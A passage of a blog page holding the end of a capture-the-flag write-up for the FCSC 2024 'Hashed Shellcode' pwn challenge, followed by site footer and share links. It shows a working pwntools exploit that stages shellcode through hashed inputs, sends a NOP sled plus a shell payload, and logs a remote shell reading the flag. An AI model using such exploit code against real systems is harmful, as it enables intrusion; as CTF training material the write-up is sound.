+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5d</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x0f\x87\x2e\xaf\x3f\xbf\x8d\xdc\x94\x55\xbb\xf0\xa4\xdc\x39\x7b\x10\x44\x14\x2a\xad\xcc\x7b\x87\x51\x44\xa5\x3d</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5e</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8c\x44\xbf\x03\x72\x3d\xe0\x5f\xfe\x3e\xa5\x9c\x4e\x79\x17\x50\xdc\xa2\x86\x7a\xf0\x22\xb5\xa8\x9d\x89\x7b\x29\x19</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5f</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8d\x7e\xc4\x46\x79\x58\x86\x9c\x32\x08\x4a\xf3\x76\x8c\xa5\x63\xde\xc3\x52\xd8\x5d\x42\x8c\x4a\x83\x67\x9f\xdc\x18</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>reset_buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FCSC_D8OHvw[`I`H1g4f?p@c1Hkj{;L&#34;</span>  <span style="color:#75715e"># dec byte ptr [rdx+0x27] ; ret</span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,reset_buf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov rsi, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov edx, 0x500
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode_bytes <span style="color:#f92672">=</span> asm(shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Len shellcode&#34;</span>,len(shellcode_bytes))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for i in range(len(shellcode_bytes)):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     print(f&#34;\\x{hex(shellcode_bytes[i])[2:].zfill(2)}&#34;,end=&#34;&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50</span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> shellcode_bytes:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">!=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(int(i)):
+</span></span><span style="display:flex;"><span>            sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dic[base<span style="color:#f92672">+</span>n] )
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#input()</span>
+</span></span><span style="display:flex;"><span>    n<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jmp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x90\xb1\xb9\x74\xd5\x64\xd9\x2e\xdb\x2f\x05\xa7\xdb\x89\x71\xbf\xa9\xf9\xfb\x87\x1d\x5a\x03\xc4\xd8\x29\x49\x12</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#input()</span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,jmp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode_sh <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>last_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> shellcode_sh <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcc</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sl(last_shellcode)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>It takes a bit time in remote because we need to send many inputs but It works !</p>
+<pre tabindex="0"><code>$ python3 solve.py REMOTE
+[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2107: Done
+Len shellcode 10
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls
+flag.txt
+hashed-shellcode
+$ cat flag.txt
+FCSC{bf7b5b359fd05f6f8c45095362f458be78769069c4707d4635239bf568771f63}
+$
+</code></pre><p>Flag : <code>FCSC{bf7b5b359fd05f6f8c45095362f458be78769069c4707d4635239bf568771f63</code></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>It was a very cool challenge thanks to the author, the base idea is very original. A bit sad to have losen time with the library problem but on second thought it allows me to have a more cleaner solution.</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#resolution">Resolution</a>
+      <ul>
+        <li><a href="#debugging-the-context">Debugging the context</a></li>
+        <li><a href="#start-to-create-hashes">Start to create hashes</a></li>
+        <li><a href="#remote-exploit">Remote exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&text=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&is_video=false&description=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&name=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn&description=This%20is%20the%20write-up%20of%20Hashed%20Shellcode%20challenge%20which%20was%20in%20the%20Pwn%20category%20for%20the%20FCSC%202024.%20It%20is%20a%20shellcode%20challenge%20based%20on%20hashes%20of%20inputs.%0aDescription%20Did%20you%20like%20FCSC%202021%26rsquo%3bs%20Encrypted%20Shellcode%3f%20Guess%20what%3f%20Here%26rsquo%3bs%20the%20hashed%20version%21%0aResolution%20Here%20is%20the%20code%20of%20the%20binary%20%3a%0av7%20%3d%20__readfsqword%280x28u%29%3b%20if%20%28%20mprotect%28%28void%20%2a%29%28%28unsigned%20__int64%29input_conv_shellcode%20%26amp%3b%200xFFFFFFFFFFFFF000LL%29%2c%200x1000uLL%2c%207%29%20%29%20%7b%20perror%28%26%2334%3bmprotect%26%2334%3b%29%3b%20exit%281%29%3b%20%7d%20chk%20%3d%200LL%3b%20do%20%7b%20while%20%28%201%20%29%20%7b%20puts%28%26%2334%3bInput%3a%26%2334%3b%29%3b%20memset%28input_conv_shellcode%2c%200%2c%20sizeof%28input_conv_shellcode%29%29%3b%20size_read%20%3d%20read%280%2c%20input_conv_shellcode%2c%200x20uLL%29%3b%20if%20%28%20size_read%20%26lt%3b%3d%200%20%29%20%7b%20perror%28%26%2334%3bread%26%2334%3b%29%3b%20exit%281%29%3b%20%7d%20if%20%28%20input_conv_shellcode%5bsize_read%20-%201%5d%20%3d%3d%20%26%2339%3b%5cn%26%2339%3b%20%29%20input_conv_shellcode%5b--size_read%5d%20%3d%200%3b%20chk%20%2b%3d%20size_read%3b%20chk%20-%3d%20input_conv_shellcode%5b0%5d%20%3d%3d%20%26%2339%3bF%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b1%5d%20%3d%3d%20%26%2339%3bC%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b2%5d%20%3d%3d%20%26%2339%3bS%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b3%5d%20%3d%3d%20%26%2339%3bC%26%2339%3b%3b%20j%20%3d%205%3b%20chk%20-%3d%20input_conv_shellcode%5b4%5d%20%3d%3d%20%26%2339%3b_%26%2339%3b%3b%20while%20%28%20size_read%20%26gt%3b%20j%20%29%20%7b%20if%20%28%20strchr%28%20%26%2334%3b0123456789%3a%3b%26lt%3b%3d%26gt%3b%3f" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&t=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
